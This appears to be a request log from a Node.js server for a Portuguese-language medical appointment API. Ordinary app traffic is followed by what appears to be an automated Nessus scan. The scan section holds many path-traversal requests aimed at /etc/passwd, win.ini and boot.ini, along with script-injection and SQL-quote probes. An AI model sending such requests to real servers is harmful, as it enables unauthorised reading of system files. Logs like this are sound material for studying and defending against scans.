Server is running on port 3000
[2026-06-21T20:11:12.390Z] GET /api/paineladm
[2026-06-21T20:13:58.911Z] GET /api/consultastotas
[2026-06-21T20:13:58.921Z] GET /api/usuarioperfil
[2026-06-21T20:14:38.827Z] POST /api/login
[2026-06-21T20:14:42.315Z] GET /api/paineladm
[2026-06-21T20:14:42.328Z] GET /api/usuarios/listagemusuario
[2026-06-21T20:14:42.404Z] GET /api/funcoes
[2026-06-21T23:13:59.080Z] GET /api/especialidade/nomes
[2026-06-21T23:14:08.179Z] GET /api/agendamedicafiltrar/6a357775fb5ae80f5bc73cc5
[2026-06-21T23:14:13.295Z] GET /api/agendamedicafiltrar/6a3577d2fb5ae80f5bc73cc7
[2026-06-21T23:14:16.558Z] GET /api/agendamedicafiltrar/6a29e203101fd2c671f5a5ef
[2026-06-22T12:04:16.204Z] GET /api/consultastotas
[2026-06-22T12:04:16.217Z] GET /api/usuarioperfil
[2026-06-22T12:05:07.172Z] POST /api/login
[2026-06-22T12:05:30.906Z] POST /api/login
[2026-06-22T12:05:40.989Z] POST /api/login
[2026-06-22T12:05:44.209Z] GET /api/paineladm
[2026-06-22T12:05:44.463Z] GET /api/funcoes
[2026-06-22T12:05:44.466Z] GET /api/usuarios/listagemusuario
[2026-06-22T12:05:51.094Z] GET /api/usuarioperfil
[2026-06-22T12:05:51.102Z] GET /api/consultastotas
[2026-06-22T12:06:09.284Z] POST /api/login
[2026-06-22T12:06:12.515Z] GET /api/paineladm
[2026-06-22T12:06:12.562Z] GET /api/usuarios/listagemusuario
[2026-06-22T12:06:12.566Z] GET /api/funcoes
[2026-06-22T12:06:14.917Z] GET /api/consultastotas
[2026-06-22T12:06:14.918Z] GET /api/usuarioperfil
[2026-06-22T12:06:25.957Z] GET /api/usuarioperfil
[2026-06-22T12:06:25.959Z] GET /api/consultastotas
[2026-06-22T12:09:24.415Z] POST /api/usuarios
[2026-06-22T12:09:50.913Z] POST /api/usuarios
[2026-06-22T12:10:53.519Z] POST /api/usuarios/confirmar
[2026-06-22T12:11:18.266Z] POST /api/login
[2026-06-22T12:11:21.586Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:11:21.653Z] GET /api/especialidade/nomes
[2026-06-22T12:11:26.018Z] GET /api/usuarioperfil
[2026-06-22T12:11:26.088Z] GET /api/consultastotas
[2026-06-22T12:12:34.025Z] POST /api/login
[2026-06-22T12:12:37.288Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:12:37.338Z] GET /api/especialidade/nomes
[2026-06-22T12:13:12.898Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:13:13.418Z] GET /api/especialidade/nomes
[2026-06-22T12:13:15.240Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:13:15.299Z] GET /api/especialidade/nomes
[2026-06-22T12:13:16.814Z] GET /api/marcacaofeitas?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:13:16.863Z] GET /api/especialidade/nomes
[2026-06-22T12:13:20.190Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:13:20.241Z] GET /api/especialidade/nomes
[2026-06-22T12:13:25.002Z] GET /api/especialidade/nomes
[2026-06-22T12:13:27.351Z] GET /api/agendamedicafiltrar/6a29e203101fd2c671f5a5ef
[2026-06-22T12:13:56.325Z] GET /api/agendamedicafiltrar/6a29e203101fd2c671f5a5ef
[2026-06-22T12:14:33.693Z] GET /api/agendamedicafiltrar/6a29e203101fd2c671f5a5ef
[2026-06-22T12:16:56.504Z] POST /api/marcacao
[2026-06-22T12:17:34.764Z] GET /api/marcacaofeitas?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T12:17:34.942Z] GET /api/especialidade/nomes
[2026-06-22T12:18:11.295Z] GET /api/usuarioperfil
[2026-06-22T12:18:11.303Z] GET /api/consultastotas
[2026-06-22T16:50:22.012Z] GET /
[2026-06-22T16:50:25.121Z] GET /
[2026-06-22T16:50:25.128Z] GET /
[2026-06-22T16:50:25.131Z] GET /login/?next=/
[2026-06-22T16:50:25.419Z] GET /sse
[2026-06-22T16:50:41.348Z] GET /
[2026-06-22T16:50:41.479Z] GET /
[2026-06-22T16:50:41.559Z] GET /aboutprinter.html
[2026-06-22T16:50:41.562Z] GET /properties/configuration.php?tab=Status
[2026-06-22T16:50:41.725Z] GET /properties/description.dhtml
[2026-06-22T16:50:41.728Z] GET /properties/configuration.php?tab=Status
[2026-06-22T16:50:41.731Z] GET /header.php?tab=status
[2026-06-22T16:50:41.911Z] GET /
[2026-06-22T16:50:41.938Z] HEAD /
[2026-06-22T16:50:41.940Z] HEAD /
[2026-06-22T16:50:43.095Z] GET /
[2026-06-22T16:50:44.151Z] GET /login.php
[2026-06-22T16:50:44.161Z] GET /this_server/all_settings.shtml
[2026-06-22T16:50:44.165Z] GET /
[2026-06-22T16:50:44.170Z] GET /authenticate/login
[2026-06-22T16:50:44.174Z] GET /start.js
[2026-06-22T16:50:44.178Z] GET /tmui/
[2026-06-22T16:50:44.181Z] GET /login
[2026-06-22T16:50:44.186Z] GET /netmri/config/userAdmin/login.tdf
[2026-06-22T16:50:44.191Z] GET /scgi-bin/platform.cgi
[2026-06-22T16:50:44.195Z] GET /admin/login.do
[2026-06-22T16:50:44.197Z] GET /en/main.js
[2026-06-22T16:50:44.200Z] GET /mgmt/login?dest=%2Fmgmt%2Fgui%3Fp%3Dhome&reason=&username=
[2026-06-22T16:50:44.203Z] GET /dms2/Login.jsp
[2026-06-22T16:50:44.207Z] GET /login
[2026-06-22T16:50:44.211Z] GET /home.htm
[2026-06-22T16:50:44.231Z] GET /sws/data/sws_data.js
[2026-06-22T16:50:44.235Z] GET /wcd/system.xml
[2026-06-22T16:50:44.238Z] GET /js/Device.js
[2026-06-22T16:50:44.241Z] GET /ptz.htm
[2026-06-22T16:50:44.244Z] GET /admin/login.jsp
[2026-06-22T16:50:44.249Z] GET /loginMsg.js
[2026-06-22T16:50:44.619Z] GET /login.html
[2026-06-22T16:50:44.702Z] GET /Home.do
[2026-06-22T16:50:44.867Z] GET /admin_ui/mas/ent/login.html
[2026-06-22T16:50:44.948Z] GET //
[2026-06-22T16:50:45.045Z] GET /intruvert/jsp/admin/Login.jsp
[2026-06-22T16:50:45.145Z] GET /commoncgi/servlet/CCGIServlet?ApHost=PDT_InterScan_NT&CGIAlias=PDT_InterScan_NT&File=logout.htm
[2026-06-22T16:50:45.279Z] GET /xmldata?item=All
[2026-06-22T16:50:45.287Z] GET /upnp/BasicDevice.xml
[2026-06-22T16:50:45.289Z] GET /
[2026-06-22T16:50:45.406Z] GET /robots.txt
[2026-06-22T16:50:45.414Z] GET /sitemap.xml
[2026-06-22T16:50:45.417Z] GET /.cobalt
[2026-06-22T16:50:45.419Z] GET /admin.back
[2026-06-22T16:50:45.421Z] GET /file
[2026-06-22T16:50:45.423Z] GET /wavemaster.internal
[2026-06-22T16:50:45.425Z] GET /
[2026-06-22T16:50:45.754Z] GET /
[2026-06-22T16:50:45.807Z] GET /MSWSMTP/Common/Authentication/Logon.aspx
[2026-06-22T16:50:45.915Z] GET /
[2026-06-22T16:50:56.403Z] GET /hV87BFJeJFvL.html
[2026-06-22T16:50:56.411Z] GET /hV87BFJeJFvL.cgi
[2026-06-22T16:50:56.414Z] GET /hV87BFJeJFvL.sh
[2026-06-22T16:50:56.416Z] GET /hV87BFJeJFvL.pl
[2026-06-22T16:50:56.418Z] GET /hV87BFJeJFvL.inc
[2026-06-22T16:50:56.420Z] GET /hV87BFJeJFvL.shtml
[2026-06-22T16:50:56.422Z] GET /hV87BFJeJFvL.asp
[2026-06-22T16:50:56.424Z] GET /hV87BFJeJFvL.php
[2026-06-22T16:50:56.426Z] GET /hV87BFJeJFvL.php3
[2026-06-22T16:50:56.429Z] GET /hV87BFJeJFvL.cfm
[2026-06-22T16:50:56.432Z] GET /cgi-bin/hV87BFJeJFvL.html
[2026-06-22T16:50:56.434Z] GET /cgi-bin/hV87BFJeJFvL.cgi
[2026-06-22T16:50:56.436Z] GET /cgi-bin/hV87BFJeJFvL.sh
[2026-06-22T16:50:56.460Z] GET /cgi-bin/hV87BFJeJFvL.pl
[2026-06-22T16:50:56.463Z] GET /cgi-bin/hV87BFJeJFvL.inc
[2026-06-22T16:50:56.465Z] GET /cgi-bin/hV87BFJeJFvL.shtml
[2026-06-22T16:50:56.467Z] GET /cgi-bin/hV87BFJeJFvL.asp
[2026-06-22T16:50:56.469Z] GET /cgi-bin/hV87BFJeJFvL.php
[2026-06-22T16:50:56.472Z] GET /cgi-bin/hV87BFJeJFvL.php3
[2026-06-22T16:50:56.474Z] GET /cgi-bin/hV87BFJeJFvL.cfm
[2026-06-22T16:50:56.491Z] GET /scripts/hV87BFJeJFvL.html
[2026-06-22T16:50:56.494Z] GET /scripts/hV87BFJeJFvL.cgi
[2026-06-22T16:50:56.499Z] GET /scripts/hV87BFJeJFvL.sh
[2026-06-22T16:50:56.502Z] GET /scripts/hV87BFJeJFvL.pl
[2026-06-22T16:50:56.505Z] GET /scripts/hV87BFJeJFvL.inc
[2026-06-22T16:50:56.507Z] GET /scripts/hV87BFJeJFvL.shtml
[2026-06-22T16:50:56.510Z] GET /scripts/hV87BFJeJFvL.asp
[2026-06-22T16:50:56.513Z] GET /scripts/hV87BFJeJFvL.php
[2026-06-22T16:50:56.515Z] GET /scripts/hV87BFJeJFvL.php3
[2026-06-22T16:50:56.518Z] GET /scripts/hV87BFJeJFvL.cfm
[2026-06-22T16:50:57.145Z] GET /
[2026-06-22T16:50:57.256Z] GET /
[2026-06-22T16:50:57.363Z] GET /
[2026-06-22T16:50:57.527Z] GET /
[2026-06-22T16:50:57.609Z] GET /ext-js/app/common/zld_product_spec.js
[2026-06-22T16:50:57.689Z] GET /
[2026-06-22T16:50:57.795Z] GET /
[2026-06-22T16:50:57.869Z] GET /
[2026-06-22T16:50:58.034Z] TRACE /Nessus373368333.html
[2026-06-22T16:50:58.152Z] GET /xampp/index.php
[2026-06-22T16:50:58.274Z] GET /
[2026-06-22T16:50:58.298Z] GET /
[2026-06-22T16:50:58.414Z] GET /Wsusadmin/Errors/BrowserSettings.aspx
[2026-06-22T16:50:58.465Z] GET /wsman-anon
[2026-06-22T16:50:58.467Z] GET /wsman
[2026-06-22T16:50:58.492Z] GET /nessus345678.html
[2026-06-22T16:50:58.584Z] GET /nessus345678.html
[2026-06-22T16:50:58.765Z] GET /SnoopServlet/
[2026-06-22T16:50:58.767Z] GET /snoopservlet/
[2026-06-22T16:50:58.770Z] GET /snoop/
[2026-06-22T16:50:58.773Z] GET /servlet/SnoopServlet/
[2026-06-22T16:50:58.775Z] GET /servlet/snoopservlet/
[2026-06-22T16:50:58.777Z] GET /servlet/snoop/
[2026-06-22T16:50:58.967Z] GET /robots.txt
[2026-06-22T16:50:59.039Z] GET /favicon.ico
[2026-06-22T16:50:59.401Z] GET /triton-help/en/first.htm
[2026-06-22T16:50:59.485Z] GET /console/login/LoginForm.jsp
[2026-06-22T16:50:59.489Z] GET /wls-wsat/CoordinatorPortType
[2026-06-22T16:50:59.585Z] SEARCH /
[2026-06-22T16:51:02.452Z] PROPFIND /
[2026-06-22T16:51:02.573Z] GET /usage/
[2026-06-22T16:51:02.583Z] GET /webalizer/
[2026-06-22T16:51:03.504Z] GET /../../../../../../../../../../../../windows/win.ini
[2026-06-22T16:51:03.508Z] GET /../../../../../../../../../../../../winnt/win.ini
[2026-06-22T16:51:03.540Z] GET /..\..\..\..\..\..\..\..\..\..\windows\win.ini
[2026-06-22T16:51:03.543Z] GET /..\..\..\..\..\..\..\..\..\..\winnt\win.ini
[2026-06-22T16:51:03.545Z] GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
[2026-06-22T16:51:03.548Z] GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin.ini
[2026-06-22T16:51:03.550Z] GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin%2eini
[2026-06-22T16:51:03.553Z] GET /%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwinnt%5cwin%2eini
[2026-06-22T16:51:03.556Z] GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
[2026-06-22T16:51:03.559Z] GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini
[2026-06-22T16:51:03.562Z] GET /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./windows/win.ini
[2026-06-22T16:51:03.564Z] GET /.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./winnt/win.ini
[2026-06-22T16:51:03.567Z] GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
[2026-06-22T16:51:03.570Z] GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini
[2026-06-22T16:51:03.573Z] GET /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows\win.ini
[2026-06-22T16:51:03.576Z] GET /%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\winnt\win.ini
[2026-06-22T16:51:03.579Z] GET /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
[2026-06-22T16:51:03.584Z] GET /.../.../.../.../.../.../.../.../.../windows/win.ini
[2026-06-22T16:51:03.586Z] GET /.../.../.../.../.../.../.../.../.../winnt/win.ini
[2026-06-22T16:51:03.589Z] GET /...\...\...\...\...\...\...\...\...\windows\win.ini
[2026-06-22T16:51:03.592Z] GET /...\...\...\...\...\...\...\...\...\winnt\win.ini
[2026-06-22T16:51:03.594Z] GET /..../..../..../..../..../..../..../..../..../windows/win.ini
[2026-06-22T16:51:03.597Z] GET /..../..../..../..../..../..../..../..../..../winnt/win.ini
[2026-06-22T16:51:03.599Z] GET /....\....\....\....\....\....\....\....\....\windows\win.ini
[2026-06-22T16:51:03.601Z] GET /....\....\....\....\....\....\....\....\....\winnt\win.ini
[2026-06-22T16:51:03.604Z] GET /././././././../../../../../windows/win.ini
[2026-06-22T16:51:03.606Z] GET /././././././../../../../../winnt/win.ini
[2026-06-22T16:51:03.629Z] GET /nessus\..\..\..\..\..\..\windows\win.ini
[2026-06-22T16:51:03.632Z] GET /nessus\..\..\..\..\..\..\winnt\win.ini
[2026-06-22T16:51:03.634Z] GET /%80../%80../%80../%80../%80../%80../windows/win.ini
[2026-06-22T16:51:03.637Z] GET /%80../%80../%80../%80../%80../%80../winnt/win.ini
[2026-06-22T16:51:03.640Z] GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./windows/win.ini
[2026-06-22T16:51:03.643Z] GET /%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./%c0.%c0./winnt/win.ini
[2026-06-22T16:51:03.646Z] GET /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/windows/win.ini
[2026-06-22T16:51:03.648Z] GET /%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/winnt/win.ini
[2026-06-22T16:51:03.651Z] GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini
[2026-06-22T16:51:03.653Z] GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/winnt/win.ini
[2026-06-22T16:51:03.656Z] GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini
[2026-06-22T16:51:03.660Z] GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini
[2026-06-22T16:51:03.663Z] GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
[2026-06-22T16:51:03.665Z] GET /scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini
[2026-06-22T16:51:03.690Z] GET /../../../../../../../../../../../../etc/passwd
[2026-06-22T16:51:03.693Z] GET /./../../../../../../../../../../../etc/passwd
[2026-06-22T16:51:03.696Z] GET //../../../../../../../../../../../../etc/passwd
[2026-06-22T16:51:03.698Z] GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd
[2026-06-22T16:51:03.701Z] GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[2026-06-22T16:51:03.704Z] GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
[2026-06-22T16:51:03.707Z] GET /.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
[2026-06-22T16:51:03.710Z] GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
[2026-06-22T16:51:03.713Z] GET /././././././../../../../../etc/passwd
[2026-06-22T16:51:03.715Z] GET /%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd
[2026-06-22T16:51:03.717Z] GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd
[2026-06-22T16:51:03.720Z] GET /scripts/fake.cgi?arg=/dir/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[2026-06-22T16:51:06.026Z] GET /active.log
[2026-06-22T16:51:06.104Z] GET /images
[2026-06-22T16:51:06.188Z] GET /main_internet.php
[2026-06-22T16:51:06.291Z] GET /auth/login
[2026-06-22T16:51:06.392Z] GET /cfg/shortcuts
[2026-06-22T16:51:06.395Z] GET /hc/error/
[2026-06-22T16:51:06.497Z] GET /ui/login.action
[2026-06-22T16:51:06.585Z] GET /login
[2026-06-22T16:51:06.695Z] GET /hc/admin/login/
[2026-06-22T16:51:06.812Z] GET /login
[2026-06-22T16:51:06.920Z] GET /qip
[2026-06-22T16:51:06.924Z] GET /qip
[2026-06-22T16:51:07.049Z] GET /
[2026-06-22T16:51:07.124Z] GET /
[2026-06-22T16:51:07.192Z] GET /
[2026-06-22T16:51:07.260Z] GET /
[2026-06-22T16:51:07.325Z] GET /portal/diag/index.jsp
[2026-06-22T16:51:07.409Z] GET /menu.htm
[2026-06-22T16:51:07.522Z] HEAD /someunexistantstuff2060330862086762979.html
[2026-06-22T16:51:07.526Z] HEAD /someunexistantstuff.exe
[2026-06-22T16:51:07.529Z] GET /someunexistantantsutff1251238985160626982.html
[2026-06-22T16:51:07.557Z] GET /someunexistantantsutff.exe
[2026-06-22T16:51:09.744Z] GET /auth/login
[2026-06-22T16:51:09.837Z] GET /login
[2026-06-22T16:51:09.941Z] GET /ui/
[2026-06-22T16:51:09.945Z] GET /ui/
[2026-06-22T16:51:09.948Z] GET /recoveryconsole/
[2026-06-22T16:51:10.084Z] GET /VncViewer.jar
[2026-06-22T16:51:10.192Z] POST /
[2026-06-22T16:51:10.284Z] GET /
[2026-06-22T16:51:10.358Z] GET //user/index.php
[2026-06-22T16:51:10.414Z] GET /login.html
[2026-06-22T16:51:10.465Z] GET /pages/login.php
[2026-06-22T16:51:10.516Z] GET //
[2026-06-22T16:51:10.568Z] GET /mdm/web/login.htm
[2026-06-22T16:51:10.632Z] GET /logon.jsp
[2026-06-22T16:51:10.690Z] GET /officescan/console/html/common/l10n/l10n.global.js
[2026-06-22T16:51:10.742Z] GET /webapp/js/UI_String.en-US.js
[2026-06-22T16:51:10.835Z] GET /webpages/
[2026-06-22T16:51:10.838Z] GET /webpages/index.html
[2026-06-22T16:51:10.840Z] GET /webpages/login.html
[2026-06-22T16:51:10.921Z] GET /index.asp%5C
[2026-06-22T16:51:10.923Z] GET /default.asp%5C
[2026-06-22T16:51:10.924Z] GET /login.asp%5C
[2026-06-22T16:51:11.012Z] GET /nessus-check/tomcat_error_version.nasl
[2026-06-22T16:51:11.089Z] GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252
[2026-06-22T16:51:11.151Z] GET /VncViewer.jar
[2026-06-22T16:51:11.214Z] GET /tightvnc-jviewer.jar
[2026-06-22T16:51:11.281Z] GET /spotfire/about.jsp
[2026-06-22T16:51:11.337Z] GET /jasperserver-pro/login.html
[2026-06-22T16:51:11.382Z] POST /index.php?s=xxxx
[2026-06-22T16:51:11.441Z] GET /
[2026-06-22T16:51:11.444Z] GET /
[2026-06-22T16:51:11.579Z] GET /etc/passwd
[2026-06-22T16:51:11.592Z] GET //etc/passwd
[2026-06-22T16:51:11.695Z] GET /tos/index.php?user/login
[2026-06-22T16:51:11.698Z] GET /tos/
[2026-06-22T16:51:11.779Z] GET /js/macro_config.js
[2026-06-22T16:51:11.839Z] GET /
[2026-06-22T16:51:11.896Z] GET /auth/login
[2026-06-22T16:51:11.966Z] GET /
[2026-06-22T16:51:12.018Z] GET /en/admin/aggregate.asp
[2026-06-22T16:51:12.051Z] GET /spywall/login.php
[2026-06-22T16:51:12.112Z] GET /brightmail/viewLogin.do
[2026-06-22T16:51:12.171Z] POST /webui/apps/sdcss
[2026-06-22T16:51:12.260Z] GET /.svn/entries
[2026-06-22T16:51:12.343Z] GET /index.jsp
[2026-06-22T16:51:12.346Z] GET /index.JSP
[2026-06-22T16:51:12.709Z] GET /idm/login.jsp?lang=en&cntry=
[2026-06-22T16:51:12.788Z] GET /config-browser/showJars.xhtml
[2026-06-22T16:51:12.872Z] GET /
[2026-06-22T16:51:12.921Z] GET /login
[2026-06-22T16:51:13.002Z] GET /userportal/webpages/myaccount/login.jsp
[2026-06-22T16:51:13.004Z] GET /webconsole/webpages/login.jsp
[2026-06-22T16:51:13.098Z] GET /
[2026-06-22T16:51:13.151Z] GET /
[2026-06-22T16:51:13.216Z] GET /
[2026-06-22T16:51:13.271Z] GET /api/sonicos/is-sslvpn-enabled
[2026-06-22T16:51:13.352Z] GET /sgms/login
[2026-06-22T16:51:13.426Z] GET /login.html
[2026-06-22T16:51:13.482Z] GET /index.html
[2026-06-22T16:51:13.485Z] GET /
[2026-06-22T16:51:13.487Z] GET /nexus/index.html
[2026-06-22T16:51:13.580Z] GET /solr/#
[2026-06-22T16:51:13.583Z] GET /#
[2026-06-22T16:51:13.660Z] GET //admincp/login.php
[2026-06-22T16:51:13.718Z] GET /cgi-bin/index.cgi
[2026-06-22T16:51:13.720Z] GET /help/en/Forget_pw.html
[2026-06-22T16:51:13.789Z] GET /helpdesk/WebObjects/Helpdesk.woa
[2026-06-22T16:51:13.850Z] GET /swvm/ConsoleContainer.jsp
[2026-06-22T16:51:13.913Z] GET /api2/Localization/SolarWinds.Orion.SamAppOptics.Strings.dll
[2026-06-22T16:51:13.915Z] GET /
[2026-06-22T16:51:14.005Z] GET /Orion/Login.aspx
[2026-06-22T16:51:14.007Z] GET /Orion/Login.asp
[2026-06-22T16:51:14.091Z] GET /lem/index.html
[2026-06-22T16:51:14.142Z] POST /av-centerd
[2026-06-22T16:51:14.184Z] GET /forum/register.asp
[2026-06-22T16:51:14.227Z] GET /
[2026-06-22T16:51:14.285Z] GET /sitemap.xml
[2026-06-22T16:51:14.388Z] GET /
[2026-06-22T16:51:14.443Z] GET /SilverStream
[2026-06-22T16:51:14.495Z] GET /SilverStream/Meta/Tables/?access-mode=text
[2026-06-22T16:51:14.559Z] GET /polarion/
[2026-06-22T16:51:16.683Z] GET /stream/0
[2026-06-22T16:51:16.773Z] GET /content/AaHynhhskb.mp3
[2026-06-22T16:51:16.838Z] GET /tarantella/cgi-bin/secure/ttawlogin.cgi/?action=bootstrap
[2026-06-22T16:51:16.910Z] GET /servlet/com.newatlanta.servletexec.JSP10Servlet
[2026-06-22T16:51:16.971Z] GET /servlet/com.newatlanta.servletexec.JSP10Servlet/..%5c..%5cglobal.asa
[2026-06-22T16:51:17.043Z] GET /SchneiderUPS/
[2026-06-22T16:51:17.136Z] GET /
[2026-06-22T16:51:17.242Z] POST /sawmillcl.exe
[2026-06-22T16:51:17.245Z] GET /sawmillcl.exe?ho+{COMPLETE_VERSION}
[2026-06-22T16:51:17.249Z] POST /sawmill6cl.exe
[2026-06-22T16:51:17.251Z] GET /sawmill6cl.exe?ho+{COMPLETE_VERSION}
[2026-06-22T16:51:17.254Z] POST /
[2026-06-22T16:51:17.257Z] GET /?ho+{COMPLETE_VERSION}
[2026-06-22T16:51:17.551Z] GET /SAPHostControl/?wsdl
[2026-06-22T16:51:17.639Z] GET /AdminTools/querybuilder/nn.jsp
[2026-06-22T16:51:17.720Z] GET /sapmc/sapmc.html
[2026-06-22T16:51:17.793Z] GET /MagicInfo/config.js
[2026-06-22T16:51:17.945Z] GET /search/results.stm
[2026-06-22T16:51:18.026Z] GET /WebID/IISWebAgentIF.dll?postdata="><script>foo</script>
[2026-06-22T16:51:18.111Z] GET /
[2026-06-22T16:51:18.214Z] GET /apps/zxtm/login.cgi
[2026-06-22T16:51:18.279Z] GET /login
[2026-06-22T16:51:18.541Z] GET /cgi-bin/client_execute.cgi?tUD=0
[2026-06-22T16:51:18.544Z] GET /wrcontrollite.ssi
[2026-06-22T16:51:18.546Z] GET /login1.htm
[2026-06-22T16:51:18.549Z] GET /
[2026-06-22T16:51:18.554Z] GET /login.html?1600
[2026-06-22T16:51:18.557Z] GET /
[2026-06-22T16:51:18.561Z] GET /eyespyfx_large.jsp
[2026-06-22T16:51:18.563Z] GET /cgi-bin/guestimage.html
[2026-06-22T16:51:18.567Z] GET /pda/
[2026-06-22T16:51:18.570Z] GET /ivc2/Backup/IVC1/html/index.htm
[2026-06-22T16:51:18.573Z] GET /view/hsrindex.shtml
[2026-06-22T16:51:18.576Z] GET /Webcam/webcam.html
[2026-06-22T16:51:18.579Z] GET /cgi-bin/camctrl.cgi
[2026-06-22T16:51:18.582Z] GET /cgi-bin/ctrldirect.cgi
[2026-06-22T16:51:18.585Z] GET /user_view_S.htm
[2026-06-22T16:51:18.588Z] GET /ViewerFrame?Mode=Motion
[2026-06-22T16:51:18.591Z] GET /app/idxasp.html
[2026-06-22T16:51:18.594Z] GET /view/index.shtml
[2026-06-22T16:51:18.597Z] GET /view/view.shtml
[2026-06-22T16:51:18.601Z] GET /main.cgi?next_file=main.htm
[2026-06-22T16:51:18.604Z] GET /view.html
[2026-06-22T16:51:19.467Z] GET /vncviewer.jar
[2026-06-22T16:51:19.550Z] GET /names.nsf/view?ReadDesign
[2026-06-22T16:51:19.598Z] GET /login.php
[2026-06-22T16:51:19.695Z] GET /
[2026-06-22T16:51:19.828Z] GET /am_bin/amlogin
[2026-06-22T16:51:19.898Z] GET /index.html
[2026-06-22T16:51:19.975Z] GET /cgi-bin/authLogin.cgi
[2026-06-22T16:51:20.057Z] GET /cgi-bin/authLogin.cgi
[2026-06-22T16:51:20.129Z] GET /photo/lang/ENG.js
[2026-06-22T16:51:20.376Z] GET /1782147080/facts/172.20.10.2
[2026-06-22T16:51:20.379Z] GET /1782147080/certificate/172.20.10.2
[2026-06-22T16:51:20.381Z] GET /v2.0/environments/172.20.10.2
[2026-06-22T16:51:20.383Z] GET /puppet-ca/v1/certificate/172.20.10.2
[2026-06-22T16:51:20.384Z] GET /puppet/v3/facts/172.20.10.2
[2026-06-22T16:51:20.575Z] GET /cas/login
[2026-06-22T16:51:20.584Z] GET /auth/login
[2026-06-22T16:51:20.716Z] GET /
[2026-06-22T16:51:20.798Z] GET /
[2026-06-22T16:51:20.862Z] GET /NmConsole/
[2026-06-22T16:51:20.943Z] GET /progs/homepage
[2026-06-22T16:51:21.021Z] GET /homepage/auth/login
[2026-06-22T16:51:21.114Z] GET /cgi-bin/printenv
[2026-06-22T16:51:21.177Z] GET /login
[2026-06-22T16:51:21.233Z] GET /ad_click.asp?banner_id='
[2026-06-22T16:51:21.277Z] GET /dagent/proxyreg.asp?List=
[2026-06-22T16:51:21.329Z] GET /index.php?app=main&inc=core_auth&route=login
[2026-06-22T16:51:21.442Z] GET /admin/
[2026-06-22T16:51:22.029Z] GET //perl?-v
[2026-06-22T16:51:22.037Z] GET //perl.exe?-v
[2026-06-22T16:51:22.164Z] GET /cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00
[2026-06-22T16:51:22.231Z] GET /html/en/index.htm
[2026-06-22T16:51:22.300Z] GET /login
